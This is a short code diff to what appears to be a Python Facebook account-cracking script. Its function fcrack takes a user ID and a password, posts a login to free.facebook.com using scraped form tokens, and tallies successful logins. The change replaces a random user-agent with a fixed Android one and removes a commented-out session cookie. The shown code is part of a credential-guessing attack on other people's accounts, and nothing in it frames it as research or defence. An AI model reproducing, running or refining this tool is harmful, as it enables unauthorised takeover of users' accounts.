@@ -516,7 +516,7 @@ def fcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write(f'\r [\033[0;92mMUZZI\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
-			ua = random.choice(ugen)
+			ua = "Mozilla/5.0 (Linux; Android 10; TECNO BC1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/223.0.0.11.121;]"
 			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -533,7 +533,6 @@ def fcrack(uid,pwx,tl):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=vYhhZSSawwPfOomJpTE9zKvO; sb=vYhhZUiarTtMzoF8aw8q4WXJ; m_pixel_ratio=2; locale=en_US; vpd=v1%3B676x360x2; wd=360x676; fr=0YWMopa3Jq6VUz3FO.AWVAgq0Wnu-rRoTY2GFeb4Rt5Eo.BlYYi9.ti.AAA.0.0.BlZDDV.AWVXK947_y4',
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
